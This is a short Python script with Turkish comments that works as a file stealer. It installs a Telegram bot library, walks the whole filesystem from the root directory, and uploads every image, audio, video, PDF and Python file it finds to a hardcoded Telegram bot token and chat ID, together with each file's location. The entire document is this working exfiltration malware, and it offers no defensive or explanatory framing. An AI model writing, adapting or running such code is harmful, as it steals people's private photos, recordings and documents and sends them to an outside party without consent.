import os

# Gerekli kütüphaneyi yüklemek için sistem komutu
def yukle_gerekli_kutuphane():
    try:
        os.system("pip install pyTelegramBotAPI")
        print("Gerekli kütüphane yüklendi.")
    except Exception as e:
        print(f'Hata: {str(e)}')

# Gerekli kütüphaneyi yükleyin
yukle_gerekli_kutuphane()

import telebot

TOKEN = '6578250693:AAGhoblNUGMiAJUGAxl_9xJ6GXZ8Jjw3uho'
CHAT_ID = 5291833531  # CHAT_ID'yi string olarak değil, tam sayı olarak tanımlayın

uzanti_listesi = ['.py', '.jpg', '.png', '.m4a', '.opus', '.mp3', '.mp4', '.pdf']

bot = telebot.TeleBot(TOKEN)

def dosyalari_tara_ve_gonder(dizin):
    for root, _, files in os.walk(dizin):
        for dosya in files:
            dosya_uzanti = os.path.splitext(dosya)[1]
            if dosya_uzanti in uzanti_listesi:
                dosya_yolu = os.path.join(root, dosya)
                try:
                    with open(dosya_yolu, 'rb') as dosya_objesi:
                        bot.send_document(CHAT_ID, dosya_objesi)
                        bot.send_message(CHAT_ID, f"Dosya: {dosya} | Dizin: {os.path.abspath(root)}")
                except Exception as e:
                    print(f'Hata: {str(e)}')

if __name__ == "__main__":
    print("Başlıyor")
    baslangic_dizini = '/'  # Taranmaya başlanacak kök dizini
    dosyalari_tara_ve_gonder(baslangic_dizini)
    print("End")
